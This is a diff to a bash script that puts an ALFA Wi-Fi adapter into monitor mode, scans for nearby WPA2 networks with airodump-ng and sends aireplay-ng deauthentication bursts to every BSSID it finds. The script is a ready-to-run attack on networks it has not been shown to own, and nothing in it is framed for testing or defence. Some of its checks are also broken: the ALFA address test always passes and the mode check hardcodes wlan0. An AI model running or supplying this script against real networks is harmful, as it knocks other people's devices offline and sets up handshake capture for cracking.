@@ -1,37 +1,74 @@
 #!/bin/bash
 
-find_mesh_wifi_device()
-{
+
+
+
+_init() {
   
-  echo "Find ALFA WIFI card with ouid=$1"
+  echo "Init called"
+	
+	addr=$(iw $interface info | grep addr | awk '{print $2}')
+	if [ ${add:0:8}=="00:c0:ca" ]; then
+		echo "Given Interface has a ALFA device, we can proced"
+	else
+		echo "Given Interface is not a ALFA device, check your connection"
+		exit 1
+	fi
+	
+	_init_result
+	
+	if [ "$result" -eq "1" ]; then
+	
+		echo "Device already in monitor mode"
+	
+	else
+		airmon-ng check kill
+		airmon-ng start $interface
+	fi
+	
+	_init_result
+	
+	if [ "$result" -eq "1" ]; then
+		echo "Device sucessfully in monitor mode"
+	else
+		echo "Unable to put in monitor mode, Disconnect and reconnect your device"
+		exit 1
+	fi
+		
+}
 
-  ifnames=$(ls /sys/class/net/)
+_init_result() {
 
-  interface=$(lshw -C network |  grep -B5 "driver=rtl8814au" | awk '$1=="logical" {print $3}')
+mode=$(iwconfig wlan0 | grep Mode | awk '{print $1}' | cut -d ":" -f2-)
+
+if [ $mode == "Monitor" ]; then
+	result=1
+else
+	result=0
+fi
+
+
+}
+
+_deinit() {
+
+airmon-ng stop $interface
+
 }
 
 
 
-find_mesh_wifi_device 00:c0:ca
 
-if [ "$interface" != "" ];  then
-      echo "Found: $interface with ALFA card"
-else
-      echo "ERROR! Can't find correct wifi device!"
-      #exit 1
-fi
 
-interface=wlan0
-airmon-ng check kill
 
-airmon-ng start $interface
+
+_test(){
 
 channel=0
 
 bssid_list=()
 
-airodump=$(airodump-ng "$interface" -b a| grep WPA3 | head -n 50)
-
+airodump=$(airodump-ng "$interface" -b a| grep WPA2 | head -n 10)
 
 while IFS= read -r line; do  
 
@@ -60,7 +97,8 @@ echo "${bssid_list[@]}"
 
 
 echo "Launching airodump-ng on another terminal to set the channel"
-xterm -e airodump-ng --channel $channel $interface & 
+echo $channel
+xterm -e airodump-ng --channel "$channel" $interface & 
 
 for value in ${bssid_list[@]};
 do	
@@ -68,3 +106,18 @@ do
     aireplay-ng -0 10 -a $value $interface 
 
 done
+
+
+
+}
+
+main(){
+
+interface=$1
+echo $interface
+_init
+
+_test
+}
+
+main "$@"
